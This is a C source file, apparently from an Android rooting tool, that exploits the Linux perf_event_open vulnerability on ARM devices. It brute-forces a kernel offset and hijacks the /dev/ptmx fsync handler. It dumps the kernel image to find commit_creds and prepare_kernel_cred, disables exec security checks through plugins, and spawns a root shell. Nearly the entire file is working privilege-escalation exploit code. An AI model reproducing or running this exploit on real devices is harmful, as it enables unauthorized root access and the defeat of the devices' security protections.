/*
 * Copyright (C) 2013 Hiroyuki Ikezoe
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/syscall.h>

#include "plugins/mole_plough_plugin.h"

#include "perf_event_exploit/perf_event.h"
#include "kallsyms/kallsyms_in_memory.h"

#ifndef __NR_perf_event_open
#define __NR_perf_event_open   (__NR_SYSCALL_BASE+364)
#endif

#define DATA_TMP_DIR "/data/local/tmp/"
#define WORK_OFFSET_FILE DATA_TMP_DIR "perf_event_exploit-work.offset"
#define LAST_OFFSET_FILE DATA_TMP_DIR "perf_event_exploit-last.offset"
#define OFFSET_FILE      DATA_TMP_DIR "perf_event_exploit.offset"

#define KERNEL_ADDRESS 0xc0008000
#define KERNEL_SIZE    0x01800000

static mole_plough_plugins *plugin_handler;

static bool
call_ptmx_fsync(void *user_data)
{
  int fd;
  int ret;

  fd = open("/dev/ptmx", O_WRONLY);
  ret = fsync(fd);
  close(fd);

  return (ret == 0);
}

static int
syscall_perf_event_open(uint32_t offset)
{
  uint64_t buf[10] = { 0x4800000001, offset, 0, 0, 0, 0x300 };
  int fd;

  fd = syscall(__NR_perf_event_open, buf, 0, -1, -1, 0);
  if (fd < 0) {
    fprintf(stderr, "Error %s\n", strerror(errno));
  }

  return fd;
}

static void *
address_converter(void *target, void *base)
{
  return target;
}

struct cred;
struct task_struct;

struct cred *(*prepare_kernel_cred)(struct task_struct *) = NULL;
int (*commit_creds)(struct cred *) = NULL;

int
obtain_root_privilege(void)
{
  mole_plough_plugin_disable_exec_security_check(plugin_handler, address_converter, NULL);

  return commit_creds(prepare_kernel_cred(0));
}

static bool
record_offset_to_file(const char *file_name, int offset)
{
  int fd;
  size_t size;
  char buffer[1024];

  fd = open(file_name, O_CREAT|O_WRONLY|O_TRUNC|O_SYNC, 0644);
  if (fd < 0) {
    return false;
  }

  size = snprintf(buffer, sizeof(buffer), "%d", offset);
  if (size != write(fd, buffer, size)) {
    close(fd);
    return false;
  }

  fsync(fd);
  close(fd);

  return true;
}

static bool
record_work_offset(int offset)
{
  return record_offset_to_file(WORK_OFFSET_FILE, offset);
}

static bool
record_last_offset(int offset)
{
  return record_offset_to_file(LAST_OFFSET_FILE, offset);
}

static bool
record_offset(int offset)
{
  return record_offset_to_file(OFFSET_FILE, offset);
}

static int
read_int_from_file(const char *file_name)
{
  FILE *fp;
  int value = -1;

  fp = fopen(file_name, "r");
  if (!fp) {
    return -1;
  }

  fscanf(fp, "%d", &value);
  fclose(fp);

  return value;
}

static int
read_offset_from_file(const char *file_name)
{
  return read_int_from_file(file_name);
}

static int
read_work_offset(void)
{
  return read_offset_from_file(WORK_OFFSET_FILE);
}

static int
read_last_possible_offset(void)
{
  return read_offset_from_file(LAST_OFFSET_FILE);
}

static int
read_offset(void)
{
  return read_offset_from_file(OFFSET_FILE);
}

static int
search_ptmx_fsync_until_reboot(int offset)
{
  while (true) {
    int fd;
    bool success;

    record_work_offset(offset);

    printf("%d\n", offset);

    fd = syscall_perf_event_open(offset|0x80000000);
    if (fd < 0) {
      printf("This expolit can not be used on this machine\n");
      return fd;
    }

    success = call_ptmx_fsync(NULL);
    close(fd);

    offset++;
  }
  return 0;
}

int
nop(int fd)
{
  return 0;
}

static bool
check_possible_offset(int offset)
{
  record_last_offset(offset);
  printf("writing last offset = %d\n", offset);

  return perf_event_run_exploit_with_offset(offset, (int)&nop, call_ptmx_fsync, NULL);
}

static int dump_code_asm[] = {
  0xe92d0008, /*   push    {r3}          */
  0xe59f3008, /*   ldr     r3, [pc, #8]  */
  0xe5930000, /*   ldr     r0, [r3]      */
  0xe8bd0008, /*   pop     {r3}          */
  0xe12fff1e, /*   bx      lr            */
  0xc0008000,
};

static bool
write_kernel_to(void *code_memory,
                bool(*write_function)(int value, void *user_data),
                void *user_data)
{
  int ptmx_fd;
  unsigned int address;
  bool success = true;

  ptmx_fd = open("/dev/ptmx", O_WRONLY);
  for (address = KERNEL_ADDRESS; address < KERNEL_ADDRESS + KERNEL_SIZE; address += 4) {
    int value;
    ((int*)code_memory)[5] = address;
    msync(code_memory, 0x20, MS_SYNC);
    value = fsync(ptmx_fd);
    if (!write_function(value, user_data)) {
      success = false;
      break;
    }
  }
  close(ptmx_fd);

  return success;
}

static bool
write_to_file(int value, void *user_data)
{
  int fd = (int)user_data;

  return (write(fd, &value, sizeof(value)) == sizeof(value));
}

static bool
write_kernel_to_file(void *dump_code, void *user_data)
{
  int fd;
  bool success;
  const char *file_name = (const char *)user_data;

  fd = open(file_name, O_CREAT|O_WRONLY|O_TRUNC, 0644);
  if (fd < 0) {
    return false;
  }

  success = write_kernel_to(dump_code, write_to_file, (void*)fd);

  close(fd);

  return success;
}

struct current_address {
  void *base_address;
  int position;
};
static bool
write_to_memory(int value, void *user_data)
{
  struct current_address *current = (struct current_address*)user_data;

  ((int*)current->base_address)[current->position] = value;
  current->position++;

  return true;
}

static bool
write_kernel_to_memory(void *dump_code, void *memory)
{
  struct current_address current;
  current.base_address = memory;
  current.position = 0;

  return write_kernel_to(dump_code, write_to_memory, &current);
}

#define MAX(x,y) (((x)>(y))?(x):(y))
static int
get_executable_address(void)
{
  int address = -1;

  address = read_int_from_file("/proc/sys/vm/mmap_min_addr");
  if (address < 0) {
    return -1;
  }

  address = MAX(address, 0x10000);

  return address;
}

static void *
setup_dump_code(void)
{
  void *dump_code;
  int executable_address;

  executable_address = get_executable_address();
  if (executable_address < 0) {
    return NULL;
  }
  dump_code = mmap((void*)executable_address, 0x20,
                   PROT_READ|PROT_WRITE|PROT_EXEC,
                   MAP_SHARED|MAP_FIXED|MAP_ANONYMOUS,
                   0, 0);
  memcpy(dump_code, dump_code_asm, sizeof(dump_code_asm));

  return dump_code;
}

static bool
dump_kernel_to(int offset,
               bool(*dump_function)(void *memory, void *user_data),
               void *user_data)
{
  void *dump_code;
  int number_of_children;

  dump_code = setup_dump_code();

  number_of_children = perf_event_write_value_at_offset(offset, (int)dump_code);
  if (number_of_children < 0) {
    munmap(dump_code, 0x20);
    return false;
  }

  if (number_of_children == 0) {
    while (true) {
      sleep(1);
    }
  }

  dump_function(dump_code, user_data);

  perf_event_reap_child_process(number_of_children);

  munmap(dump_code, 0x20);

  return true;
}

static bool
dump_kernel_to_file(int offset, const char *file_name)
{
  printf("dump kernel image to %s.\n", file_name);
  return dump_kernel_to(offset, write_kernel_to_file, (void*)file_name);
}

static bool
dump_kernel_to_memory(int offset, void *memory)
{
  printf("dump kernel image to memory.\n");
  return dump_kernel_to(offset, write_kernel_to_memory, memory);
}

static bool
dump_kernel_image(int offset, int argc, char **argv)
{
  const char *file_name = "/data/local/tmp/kernel.img";
  if (argc >= 3) {
    file_name = argv[2];
  }
  return dump_kernel_to_file(offset, file_name);
}

static bool
run_exploit(int offset)
{
  return perf_event_run_exploit_with_offset(offset, (int)&obtain_root_privilege, call_ptmx_fsync, NULL);
}

static bool
setup_kernel_functions(int offset)
{
  void *kernel;
  kallsyms *kallsyms;

  kernel = malloc(KERNEL_SIZE);
  if (!kernel) {
    return -ENOMEM;
  }

  dump_kernel_to_memory(offset, kernel);
  kallsyms = kallsyms_in_memory_init(kernel, KERNEL_SIZE);
  if (kallsyms) {
    commit_creds = (void*)kallsyms_in_memory_lookup_name(kallsyms, "commit_creds");
    prepare_kernel_cred = (void*)kallsyms_in_memory_lookup_name(kallsyms, "prepare_kernel_cred");

    if (plugin_handler) {
      mole_plough_plugin_resolve_symbols(kallsyms, plugin_handler);
    }
  }
  free(kernel);

  return (commit_creds && prepare_kernel_cred);
}

static int
run_root_shell(int offset)
{
  if (!setup_kernel_functions(offset)) {
    return -EFAULT;
  }

  printf("run root shell\n");
  run_exploit(offset);

  return execl("/system/bin/sh", "/system/bin/sh", NULL);
}

int
main(int argc, char **argv)
{
  int offset = 0;
  int last_offset = 0;
  int work_offset = 0;

  offset = read_offset();

  if (offset > 0) {
    if (argc >= 2 && !strcmp("dump", argv[1])) {
      dump_kernel_image(offset, argc, argv);
    } else {
      plugin_handler = mole_plough_plugin_load_all_plugins(argv[0]);

      run_root_shell(offset);
    }
    exit(EXIT_SUCCESS);
  }

  work_offset = read_work_offset();
  last_offset = read_last_possible_offset();

  if (work_offset > 0 && work_offset != last_offset) {
    if (check_possible_offset(work_offset)) {
      printf("found! offset = %d\n", work_offset);
      record_offset(work_offset);
      unlink(LAST_OFFSET_FILE);
      return run_root_shell(work_offset);
    }
  }

  work_offset++;
  search_ptmx_fsync_until_reboot(work_offset);
  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
